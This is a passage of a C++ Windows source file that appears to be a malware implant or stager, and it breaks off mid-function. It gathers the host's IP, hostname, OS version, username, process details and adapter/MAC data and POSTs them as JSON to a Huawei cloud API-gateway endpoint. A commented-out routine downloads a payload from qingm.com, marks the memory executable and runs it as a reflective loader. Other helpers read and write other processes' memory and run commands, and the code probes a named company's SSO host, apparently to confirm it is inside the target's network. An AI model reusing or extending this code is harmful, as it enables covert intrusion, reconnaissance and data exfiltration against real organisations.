#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma warning(disable: 4996)

#include "base.h"
#include "base64.h"
#include <iostream>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "iphlpapi.lib")

DWORD WINAPI pipeSend(LPVOID lpParam) {
    //void pipeSend(char* message) {
    HANDLE hPipe;
    //char buffer[100];
    DWORD dwWritten;
    char* message = (char*)lpParam;

    DWORD processId = GetCurrentProcessId();
    WCHAR* pipeFirstName = (WCHAR*)L"\\\\.\\pipe\\MyPipe";
    WCHAR pipeLastName[100] = L"";
    wcscat(pipeLastName, pipeFirstName);
    WCHAR processIdStr[10];
    swprintf(processIdStr, 10, L"%lu", processId);
    wcscat(pipeLastName, processIdStr);
    wprintf(pipeLastName);

    while (1) {
        // 创建命名管道
        hPipe = CreateNamedPipe(pipeLastName, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE, 1, 0, 0, 0, NULL);

        if (hPipe == INVALID_HANDLE_VALUE) {
            printf("Failed to create named pipe. Error code: %d\n", GetLastError());
            return 1;
        }

        // 等待客户端连接
        printf("Waiting for a client to connect...\n");
        if (ConnectNamedPipe(hPipe, NULL) == FALSE) {
            printf("Failed to connect to named pipe. Error code: %d\n", GetLastError());
            CloseHandle(hPipe);
            return 1;
        }
        printf("Client connected!\n");

        // 写入数据到管道
        //strcpy(buffer, "Hello from the main program!");
        if (WriteFile(hPipe, message, strlen(message) + 1, &dwWritten, NULL) == FALSE) {
            printf("Failed to write to named pipe. Error code: %d\n", GetLastError());
        }
        else {
            printf("Data written to pipe. Exiting the loop.\n");
            break;  // 写入成功后跳出循环
        }

        // 断开连接并关闭管道
        DisconnectNamedPipe(hPipe);
        CloseHandle(hPipe);
    }

    return 0;
}

void initLoad(char* message, char* lpBuf, int size) {
    printf("init==%s", message);
    HANDLE hThread;
    DWORD dwThreadId;
    hThread = CreateThread(NULL, 0, pipeSend, message, 0, &dwThreadId);
    //pipeSend(message);
    DWORD old = 0;
    VirtualProtect(lpBuf, size, PAGE_EXECUTE_READWRITE, &old);

    pInit reflective_routine = (pInit)lpBuf;
    uintptr_t lpNewBase = reflective_routine((uintptr_t)lpBuf);
    printf("New Base : %p\n", (PVOID)lpNewBase);
}



//获取本机信息添加cookie中
char* selfMachineMessage() {

    //ip+hostname
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        perror("WSAStartup");
        return NULL;
    }
    char* tmp_ip;
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        printf("Machine Name: %s\n", hostname);

        struct addrinfo* result = NULL, * ptr = NULL, hints;

        ZeroMemory(&hints, sizeof(hints));
        hints.ai_family = AF_INET;

        if (getaddrinfo(hostname, NULL, &hints, &result) == 0) {
            if (result != NULL) {
                struct sockaddr_in* sockaddr_ipv4 = (struct sockaddr_in*)result->ai_addr;
                tmp_ip = inet_ntoa(sockaddr_ipv4->sin_addr);
                printf("First IP Address: %s\n", inet_ntoa(sockaddr_ipv4->sin_addr));
            }
            freeaddrinfo(result);
        }
        else {
            perror("getaddrinfo");
        }
    }
    else {
        perror("gethostname");
    }

    WSACleanup();

    //进程名和进程id
    WCHAR process_name[MAX_PATH];
    DWORD process_id = GetCurrentProcessId();
    WCHAR* filename = (WCHAR*)L"";
    // 获取进程名
    GetModuleFileName(NULL, process_name, MAX_PATH);

    // 查找最后一个反斜杠的位置
    const wchar_t* lastBackslash = wcsrchr(process_name, L'\\');

    if (lastBackslash != NULL) {
        // 找到反斜杠，从它的下一个位置开始就是文件名
        filename = (WCHAR*)lastBackslash + 1;
    }
    else {
        // 没有找到反斜杠，整个路径就是文件名
        filename = process_name;
    }

    //wprintf(L"截取的文件名是: %s\n", filename);
    wprintf(L"Process Name: %s\n", filename);
    printf("Process ID: %u\n", process_id);


    //获取本机版本
    OSVERSIONINFO osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    char str1[20]; // 适当大小的字符数组
    //char bd[3] = {'%','d',0};
    // 使用 sprintf 将整数转换为字符串
    intToString(osvi.dwOSVersionInfoSize, str1, sizeof(str1));
    //MessageBoxA(NULL, str1, "MessageBox Title0", MB_OK);
    if (GetVersionEx(&osvi)) {
        printf("Operating System Version: %d.%d\n", osvi.dwMajorVersion, osvi.dwMinorVersion);
    }
    else {
        perror("GetVersionEx");
        return NULL;
    }

    char tmp_message[200] = { 0 };
    char* tmp = (char*)",";
    char* tmp1 = (char*)".";
    strcpy(tmp_message, tmp_ip);
    strcat(tmp_message, tmp);
    strcat(tmp_message, hostname);
    strcat(tmp_message, tmp);
    char str[20]; // 适当大小的字符数组

    // 使用 sprintf 将整数转换为字符串
    sprintf(str, "%d", osvi.dwMajorVersion);
    strcat(tmp_message, str);
    strcat(tmp_message, tmp1);
    sprintf(str, "%d", osvi.dwMinorVersion);
    strcat(tmp_message, str);

    strcat(tmp_message, tmp);
    strcat(tmp_message, WCHARtoCHAR(filename));
    strcat(tmp_message, tmp);
    sprintf(str, "%d", process_id);
    strcat(tmp_message, str);

    return tmp_message;
}

int getRandomNumber(int min, int max) {
    std::random_device rd; // 用于获取真随机数种子
    std::mt19937 gen(rd()); // 梅森旋转算法（Mersenne Twister）作为随机数引擎
    std::uniform_int_distribution<int> dis(min, max); // 定义整数均匀分布

    return dis(gen); // 生成随机数并返回
}

int isPrime(int num) {
    if (num % 2 == 1) {
        return 1;
    }
    else {
        return 0;
    }
}

WCHAR* sessionHandle(WCHAR* session) {
    wchar_t* str = (WCHAR*)malloc(400); // 额外空间给添加字符留足够的空间
    //wchar_t originalStr[STR_LEN + 1]; // 存储原始字符串
    //int i, j, len;
    srand(time(NULL)); // 设置随机数种子

    // 输入字符串
   // wprintf(L"输入字符串: ");
    //fgetws(originalStr, STR_LEN, stdin);

    // 计算字符串长度
    int len = wcslen(session);

    // 复制原始字符串到新字符串中
    //wcscpy(str, session);
    int j = 0;
    // 在指定位置插入随机字符
    for (int i = 0; i < len; i++) {
        wchar_t randomChar = L'A' + rand() % 26; // 生成随机字符
        //memmove(&str[i + 1], &str[i], (len - i + 1) * sizeof(wchar_t)); // 向后移动字符
        if (isPrime(i)) {
            str[j] = randomChar; // 插入随机字符
            j++;
        }
        str[j] = session[i];
        j++;
    }
    str[j] = (WCHAR)L'\0';
    return str;
}

void httpContent_winhttp()
{
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hOpenRequest = NULL;
    BOOL bResults = FALSE;
    DWORD bytesRead = 0;
    //DWORD bufferSize = 300000;
    //char buffer[300000];

    // Initialize WinHTTP
    if (!WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0))
    {
        printf("Failed to initialize WinHTTP.\n");
        return;
    }

    // Open a session
    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession)
    {
        printf("Failed to open WinHTTP session.\n");
        return;
    }

    //WINHTTP_PROXY_INFO proxyInfo = {};
    //proxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
    //proxyInfo.lpszProxy = (LPWSTR)L"http=127.0.0.1:8080";//修改http
    //proxyInfo.lpszProxyBypass = NULL;
    //BOOL setproxy = WinHttpSetOption(hSession, WINHTTP_OPTION_PROXY, &proxyInfo, sizeof(proxyInfo));
    //if (!setproxy) {
    //    std::wcout << L"set proxy error";
    //    return;
    //}



    hConnect = WinHttpConnect(hSession, L"sso.piccltd.com.cn", 80, 0);
    if (hConnect == NULL) {
        //std::wcout << L"hconnect失败";
        return;
    }

    // Connect to the website
    hOpenRequest = WinHttpOpenRequest(hConnect, L"GET", L"", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hOpenRequest)
    {
        printf("Failed to connect to the website.\n");
        return;
    }
    // Send the request
    if (!WinHttpSendRequest(hOpenRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
    {
        int a = GetLastError();
        printf("%d", a);
        printf("Failed to send the request.\n");
        return;
    }

    // Receive the response
    if (!WinHttpReceiveResponse(hOpenRequest, NULL))
    {
        printf("Failed to receive the response.\n");
        return;
    }

    // Check if the response header contains "Set-Cookie"
    DWORD headerSize = 0;
    if (WinHttpQueryHeaders(hOpenRequest, WINHTTP_QUERY_RAW_HEADERS_CRLF, WINHTTP_HEADER_NAME_BY_INDEX, NULL, &headerSize, WINHTTP_NO_HEADER_INDEX))
    {
        int a = GetLastError();
        printf("%d", a);
        printf("Failed to get the response header size.\n");
        return;
    }
    WCHAR* headerBuffer = (WCHAR*)malloc(headerSize + 1);
    if (!headerBuffer) {
        return;
    }
    ZeroMemory(headerBuffer, headerSize + 1);
    if (!headerBuffer)
    {
        printf("Failed to allocate memory for the response header.\n");
        return;
    }

    if (!WinHttpQueryHeaders(hOpenRequest, WINHTTP_QUERY_RAW_HEADERS_CRLF, WINHTTP_HEADER_NAME_BY_INDEX, headerBuffer, &headerSize, WINHTTP_NO_HEADER_INDEX))
    {
        printf("Failed to get the response header.\n");
        free(headerBuffer);
        return;
    }

    if (!strstr(WCHARtoCHAR(headerBuffer), "Set-Cookie"))
    {
        return;
    }



    headerSize = 0;
    if (!WinHttpQueryDataAvailable(hOpenRequest, &headerSize)) {
        return;
    }
    if (!headerSize) {
        return;
    }
    char* dataBuffer = (char*)malloc(300000);
    if (!dataBuffer) {
        return;
    }

    // Clean up

    //if (sessionNew) free(sessionNew);
    if (dataBuffer) free(dataBuffer);
    if (headerBuffer) free(headerBuffer);

    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    if (hOpenRequest) WinHttpCloseHandle(hOpenRequest);
}





//int httpContent_winhttp(char* message)
//{
//    int tmptime = 0;
//    BOOL bResults = FALSE;
//    HINTERNET hSession = WinHttpOpen(L"A WinHTTP Example Program/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
//    if (hSession == NULL) {
//        //std::wcout << L"初始化失败";
//        return 0;
//    }
//    WINHTTP_PROXY_INFO proxyInfo = {};
//    proxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
//    proxyInfo.lpszProxy = (LPWSTR)L"http=127.0.0.1:8080";//修改http
//    proxyInfo.lpszProxyBypass = NULL;
//    BOOL setproxy = WinHttpSetOption(hSession, WINHTTP_OPTION_PROXY, &proxyInfo, sizeof(proxyInfo));
//    if (!setproxy) {
//        std::wcout << L"set proxy error";
//        return 0;
//    }
//    HINTERNET hConnect = WinHttpConnect(hSession, L"qingm.com", 10086, 0);
//    if (hConnect == NULL) {
//        //std::wcout << L"hconnect失败";
//        return 0;
//    }
//    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/min/js/init/123", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);//最后一个是0，https==WINHTTP_FLAG_SECURE
//    if (hRequest == NULL) {
//        //std::wcout << L"hRequest失败";
//        return 0;
//    }
//    WCHAR tmp[400] = { 0 };
//    WCHAR* headers = (WCHAR*)L"Cookie: session_id=";
//    //printf(message);
//    //printf("\n");
//    wcscat(tmp, headers);
//    WCHAR* sessionNew = sessionHandle(CHARtoWCHAR(message));
//    //wprintf(sessionNew);
//    wcscat(tmp, sessionNew);
//
//    bResults = WinHttpAddRequestHeaders(hRequest, tmp, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
//    if (!bResults) {
//        std::cout << "add_cookie error";
//        printf("%d", GetLastError());
//        return 0;
//    }
//    BOOL bResult = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
//    // Send request
//    if (!bResult)
//    {
//        std::cout << "Failed to send request." << std::endl;
//        return -1;
//    }
//
//    bResult = WinHttpReceiveResponse(hRequest, NULL);
//    // Read response
//    if (!bResult)
//    {
//        std::cout << "Failed to receive response." << std::endl;
//        return -1;
//    }
//
//
//    //DWORD statusCode = 0;
//    //DWORD statusCodeSize = sizeof(statusCode);
//    DWORD headersSize = 0;
//    bResults = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_RAW_HEADERS_CRLF, NULL, NULL, &headersSize, NULL);
//    if (!bResults) {
//        return -1;
//    }
//    std::wstring headersBuffer;
//    headersBuffer.resize(headersSize / sizeof(wchar_t));
//    bResults = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_RAW_HEADERS_CRLF, NULL, &headersBuffer[0], &headersSize, NULL);
//    if (bResults)
//    {
//        //std::wstring statusLine = headersBuffer.substr(0, headersBuffer.find(L'\r')); // Get the status line
//        //std::wcout << statusLine << std::endl;
//        //std::cout << "Status code: " << statusCode << std::endl;
//
//        // Read response data
//        const int MAX_BUFFER_SIZE = 300000;
//        char buffer[MAX_BUFFER_SIZE];
//        DWORD bytesRead = 0;
//        DWORD totalBytesRead = 0;
//
//        while (WinHttpReadData(hRequest, buffer + totalBytesRead, MAX_BUFFER_SIZE - totalBytesRead, &bytesRead) && bytesRead > 0)
//        {
//            totalBytesRead += bytesRead;
//        }
//
//        if (totalBytesRead > 0)
//        {
//            //std::cout << content << std::endl;
//            //if () 判断返回内容，如果是允许下载则进行加载
//
//            if (headersBuffer.find(L"Set-Cookie:") != std::wstring::npos) {
//                std::cout << "Downloaded " << totalBytesRead << " bytes of data:" << std::endl;
//                std::string content(buffer, totalBytesRead);
//                initLoad(message, buffer, totalBytesRead);
//            }
//            else {
//                std::cout << "NULL" << std::endl;
//            }
//        }
//        else
//        {
//            std::cout << "No data downloaded." << std::endl;
//
//        }
//    }
//    else
//    {
//        std::cout << "Failed to retrieve status code." << std::endl;
//
//    }
//
//}
DWORD GetPidByName(const char* pName) {
    PROCESSENTRY32 pEntry;
    HANDLE snapshot;

    pEntry.dwSize = sizeof(PROCESSENTRY32);
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &pEntry) == TRUE) {
        while (Process32Next(snapshot, &pEntry) == TRUE) {
            if (_stricmp((const char*)pEntry.szExeFile, pName) == 0) {
                return pEntry.th32ProcessID;
            }
        }
    }
    CloseHandle(snapshot);
    return 0;
}

typedef NTSTATUS(*NtQueryInformationProcess2)(
    IN HANDLE,
    IN PROCESSINFOCLASS,
    OUT PVOID,
    IN ULONG,
    OUT PULONG
    );

void* readProcessMemory(HANDLE process, void* address, DWORD bytes) {
    SIZE_T bytesRead;
    char* alloc;

    alloc = (char*)malloc(bytes);
    if (alloc == NULL) {
        return NULL;
    }

    if (ReadProcessMemory(process, address, alloc, bytes, &bytesRead) == 0) {
        free(alloc);
        return NULL;
    }

    return alloc;
}

BOOL writeProcessMemory(HANDLE process, void* address, void* data, DWORD bytes) {
    SIZE_T bytesWritten;

    if (WriteProcessMemory(process, address, data, bytes, &bytesWritten) == 0) {
        return false;
    }

    return true;
}

#define BUFFER_SIZE 256

bool ExecuteCommand(const char* cmd, char* result, size_t resultSize) {
    HANDLE hStdOutRead = NULL;
    HANDLE hStdOutWrite = NULL;
    SECURITY_ATTRIBUTES sa;
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    DWORD bytesRead = 0;

    // 设置安全属性，允许管道句柄被继承
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;

    // 创建管道
    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0)) {
        fprintf(stderr, "CreatePipe failed\n");
        return false;
    }

    // 确保写入句柄不可继承
    if (!SetHandleInformation(hStdOutWrite, HANDLE_FLAG_INHERIT, 0)) {
        fprintf(stderr, "SetHandleInformation failed\n");
        CloseHandle(hStdOutRead);
        CloseHandle(hStdOutWrite);
        return false;
    }

    // 初始化STARTUPINFO结构
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    si.hStdError = hStdOutWrite;
    si.hStdOutput = hStdOutWrite;
    si.dwFlags |= STARTF_USESTDHANDLES;

    // 初始化PROCESS_INFORMATION结构
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

    // 创建进程
    if (!CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, TRUE, 0, NULL, NULL, (LPSTARTUPINFOA)&si, &pi)) {
        fprintf(stderr, "CreateProcess failed\n");
        CloseHandle(hStdOutRead);
        CloseHandle(hStdOutWrite);
        return false;
    }

    // 关闭写入句柄
    CloseHandle(hStdOutWrite);

    // 读取命令输出
    if (!ReadFile(hStdOutRead, result, resultSize - 1, &bytesRead, NULL)) {
        fprintf(stderr, "ReadFile failed\n");
        CloseHandle(hStdOutRead);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }

    // 确保结果是以空字符结尾的字符串
    result[bytesRead] = '\0';

    // 等待进程结束
    WaitForSingleObject(pi.hProcess, INFINITE);

    // 关闭句柄
    CloseHandle(hStdOutRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return true;
}

void GetAdapterInfo(char** ipinfo) {
    DWORD dwSize = 0;
    DWORD dwRetVal = 0;
    ULONG flags = GAA_FLAG_INCLUDE_PREFIX;
    ULONG family = AF_UNSPEC; // Both IPv4 and IPv6

    PIP_ADAPTER_ADDRESSES pAddresses = NULL;
    PIP_ADAPTER_ADDRESSES pCurrAddresses = NULL;

    // First call to GetAdaptersAddresses to get the size needed
    dwRetVal = GetAdaptersAddresses(family, flags, NULL, pAddresses, &dwSize);
    if (dwRetVal == ERROR_BUFFER_OVERFLOW) {
        pAddresses = (IP_ADAPTER_ADDRESSES*)malloc(dwSize);
        if (pAddresses == NULL) {
            printf("Memory allocation failed for IP_ADAPTER_ADDRESSES struct\n");
            return;
        }
    }
    else {
        printf("GetAdaptersAddresses failed with error: %d\n", dwRetVal);
        return;
    }

    // Second call to GetAdaptersAddresses to get the actual data
    dwRetVal = GetAdaptersAddresses(family, flags, NULL, pAddresses, &dwSize);
    if (dwRetVal == NO_ERROR) {
        // Allocate initial buffer for ipinfo
        size_t bufferSize = 1024;
        *ipinfo = (char*)malloc(bufferSize);
        if (*ipinfo == NULL) {
            printf("Memory allocation failed for ipinfo\n");
            free(pAddresses);
            return;
        }
        (*ipinfo)[0] = '\0'; // Initialize the buffer with an empty string

        pCurrAddresses = pAddresses;
        while (pCurrAddresses) {
            char tempBuffer[1024];
            snprintf(tempBuffer, sizeof(tempBuffer), "Adapter name: %s\nDescription: %S\nFriendly name: %S\n",
                pCurrAddresses->AdapterName,
                pCurrAddresses->Description,
                pCurrAddresses->FriendlyName);

            // Append tempBuffer to ipinfo
            size_t newLength = strlen(*ipinfo) + strlen(tempBuffer) + 1;
            if (newLength > bufferSize) {
                bufferSize = newLength + 1024; // Increase buffer size
                *ipinfo = (char*)realloc(*ipinfo, bufferSize);
                if (*ipinfo == NULL) {
                    printf("Memory reallocation failed for ipinfo\n");
                    free(pAddresses);
                    return;
                }
            }
            strcat(*ipinfo, tempBuffer);

            // Print MAC address
            snprintf(tempBuffer, sizeof(tempBuffer), "MAC address: ");
            for (DWORD i = 0; i < pCurrAddresses->PhysicalAddressLength; i++) {
                char macPart[4];
                if (i == (pCurrAddresses->PhysicalAddressLength - 1))
                    snprintf(macPart, sizeof(macPart), "%.2X\n", (int)pCurrAddresses->PhysicalAddress[i]);
                else
                    snprintf(macPart, sizeof(macPart), "%.2X-", (int)pCurrAddresses->PhysicalAddress[i]);
                strcat(tempBuffer, macPart);
            }

            // Append tempBuffer to ipinfo
            newLength = strlen(*ipinfo) + strlen(tempBuffer) + 1;
            if (newLength > bufferSize) {
                bufferSize = newLength + 1024; // Increase buffer size
                *ipinfo = (char*)realloc(*ipinfo, bufferSize);
                if (*ipinfo == NULL) {
                    printf("Memory reallocation failed for ipinfo\n");
                    free(pAddresses);
                    return;
                }
            }
            strcat(*ipinfo, tempBuffer);

            // Print IP addresses
            PIP_ADAPTER_UNICAST_ADDRESS pUnicast = pCurrAddresses->FirstUnicastAddress;
            while (pUnicast) {
                char ipStringBuffer[46];
                DWORD ipStringBufferSize = sizeof(ipStringBuffer);

                if (pUnicast->Address.lpSockaddr->sa_family == AF_INET) {
                    struct sockaddr_in* sa_in = (struct sockaddr_in*)pUnicast->Address.lpSockaddr;
                    inet_ntop(AF_INET, &(sa_in->sin_addr), ipStringBuffer, ipStringBufferSize);
                    snprintf(tempBuffer, sizeof(tempBuffer), "IPv4 address: %s\n", ipStringBuffer);
                }
                else if (pUnicast->Address.lpSockaddr->sa_family == AF_INET6) {
                    struct sockaddr_in6* sa_in6 = (struct sockaddr_in6*)pUnicast->Address.lpSockaddr;
                    inet_ntop(AF_INET6, &(sa_in6->sin6_addr), ipStringBuffer, ipStringBufferSize);
                    snprintf(tempBuffer, sizeof(tempBuffer), "IPv6 address: %s\n", ipStringBuffer);
                }

                // Append tempBuffer to ipinfo
                newLength = strlen(*ipinfo) + strlen(tempBuffer) + 1;
                if (newLength > bufferSize) {
                    bufferSize = newLength + 1024; // Increase buffer size
                    *ipinfo = (char*)realloc(*ipinfo, bufferSize);
                    if (*ipinfo == NULL) {
                        printf("Memory reallocation failed for ipinfo\n");
                        free(pAddresses);
                        return;
                    }
                }
                strcat(*ipinfo, tempBuffer);

                pUnicast = pUnicast->Next;
            }

            strcat(*ipinfo, "\n");
            pCurrAddresses = pCurrAddresses->Next;
        }
    }
    else {
        printf("GetAdaptersAddresses failed with error: %d\n", dwRetVal);
    }

    if (pAddresses) {
        free(pAddresses);
    }
}



char* GetWhoAmIResult() {
    static char username[256]; // 用于存储用户名
    DWORD size = sizeof(username);

    // 获取当前用户的用户名
    if (GetUserNameA(username, &size)) {
        return username; // 返回用户名
    }
    else {
        printf("Error getting username. Error code: %d\n", GetLastError());
        return NULL; // 返回 NULL 表示出错
    }
}


bool httpHuawei(char* jsonData) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    BOOL bResults = FALSE;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL  bSuccess = FALSE;
    DWORD dwStatusCode = 0;
    DWORD dwStatusSize = sizeof(dwStatusCode);
    DWORD dwTimeout = 5000; // 超时时间，单位为毫秒

    // JSON数据
    //const char* jsonData = "{\"name\":\"John Doe\",\"age\":30}";
    DWORD jsonDataLength = (DWORD)strlen(jsonData);

    // 初始化WinHTTP会话
    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    if (hSession) {
        // 设置连接超时时间
        WinHttpSetOption(hSession, WINHTTP_OPTION_CONNECT_TIMEOUT, &dwTimeout, sizeof(dwTimeout));
        // 设置发送超时时间
        WinHttpSetOption(hSession, WINHTTP_OPTION_SEND_TIMEOUT, &dwTimeout, sizeof(dwTimeout));
        // 设置接收超时时间
        WinHttpSetOption(hSession, WINHTTP_OPTION_RECEIVE_TIMEOUT, &dwTimeout, sizeof(dwTimeout));

        // 连接到服务器
        hConnect = WinHttpConnect(hSession, L"a83765fafeb94b66a14774cd23a75020.apig.cn-north-4.huaweicloudapis.com",
            INTERNET_DEFAULT_HTTP_PORT, 0);
    }

    if (hConnect) {
        // 创建HTTP请求
        hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/RBCXgo",
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            0);
    }

    if (hRequest) {
        // 设置HTTP头
        bResults = WinHttpAddRequestHeaders(hRequest,
            L"Content-Type: application/json",
            -1L, WINHTTP_ADDREQ_FLAG_ADD);

        // 发送请求
        if (bResults) {
            bResults = WinHttpSendRequest(hRequest,
                WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                (LPVOID)jsonData, jsonDataLength,
                jsonDataLength, 0);
        }
    }

    if (bResults) {
        // 接收响应
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    }

    // 检查HTTP状态码
    if (bResults) {
        bResults = WinHttpQueryHeaders(hRequest,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            NULL, &dwStatusCode, &dwStatusSize, NULL);
        if (bResults && dwStatusCode == 200) {
            printf("Request succeeded with status code 200.\n");
        }
        else {
            printf("Request failed with status code %d.\n", dwStatusCode);
        }
    }
    else {
        printf("Request failed with error: %d\n", GetLastError());
    }

    // 清理资源
    //if (hRequest) WinHttpCloseHandle(hRequest);
    //if (hConnect) WinHttpCloseHandle(hConnect);
    //if (hSession) WinHttpCloseHandle(hSession);

    return 0;
}

bool httpURLsso() {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    BOOL bResults = FALSE;
    DWORD dwTimeout = 5000; // 超时时间，单位为毫秒
    DWORD dwStatusCode = 0;
    DWORD dwStatusSize = sizeof(dwStatusCode);

    // 初始化WinHTTP会话
    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    if (hSession) {
        // 设置连接超时时间
        WinHttpSetOption(hSession, WINHTTP_OPTION_CONNECT_TIMEOUT, &dwTimeout, sizeof(dwTimeout));
        // 设置发送超时时间
        //WinHttpSetOption(hSession, WINHTTP_OPTION_SEND_TIMEOUT, &dwTimeout, sizeof(dwTimeout));
        // 设置接收超时时间
        //WinHttpSetOption(hSession, WINHTTP_OPTION_RECEIVE_TIMEOUT, &dwTimeout, sizeof(dwTimeout));

        // 连接到服务器
        hConnect = WinHttpConnect(hSession, L"sso.piccltd.com.cn",
            INTERNET_DEFAULT_HTTP_PORT, 0);
    }

    if (hConnect) {
        // 创建HTTP请求
        hRequest = WinHttpOpenRequest(hConnect, L"GET", NULL,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            0);
    }

    if (hRequest) {
        // 发送请求
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);
    }

    if (bResults) {
        // 接收响应
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    }

    // 检查HTTP状态码
    if (bResults) {
        bResults = WinHttpQueryHeaders(hRequest,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            NULL, &dwStatusCode, &dwStatusSize, NULL);
        if (bResults && dwStatusCode == 200) {
            return true;
            //printf("yes\n");
        }
        else {
            //printf("Request failed with status code %d.\n", dwStatusCode);
        }
    }
    else {
        //printf("Request failed with error: %d\n", GetLastError());
    }
    // 清理资源
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return false;
}

void SendRequest(const wchar_t* serverName, const wchar_t* path, const char* jsonData, BOOL useHttps) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    BOOL bResults = FALSE;
    DWORD dwTimeout = 5000; // 超时时间，单位为毫秒
    DWORD dwStatusCode = 0;
    DWORD dwStatusSize = sizeof(dwStatusCode);
    DWORD jsonDataLength = (DWORD)strlen(jsonData);
    DWORD flags = useHttps ? WINHTTP_FLAG_SECURE : 0;
    int port = useHttps ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT;

    // 初始化WinHTTP会话
    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    printf("11111111");
    getchar();

    if (hSession) {
        // 设置连接超时时间
        WinHttpSetOption(hSession, WINHTTP_OPTION_CONNECT_TIMEOUT, &dwTimeout, sizeof(dwTimeout));
        // 设置发送超时时间
        WinHttpSetOption(hSession, WINHTTP_OPTION_SEND_TIMEOUT, &dwTimeout, sizeof(dwTimeout));
        // 设置接收超时时间
        WinHttpSetOption(hSession, WINHTTP_OPTION_RECEIVE_TIMEOUT, &dwTimeout, sizeof(dwTimeout));

        // 连接到服务器
        hConnect = WinHttpConnect(hSession, serverName, port, 0);
        printf("2222222");
        getchar();
    }

    if (hConnect) {
        // 创建HTTP/HTTPS请求
        hRequest = WinHttpOpenRequest(hConnect, L"POST", path,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            flags);
        printf("3333333");
        getchar();
    }

    if (hRequest) {
        // 设置HTTP头
        bResults = WinHttpAddRequestHeaders(hRequest,
            L"Content-Type: application/json",
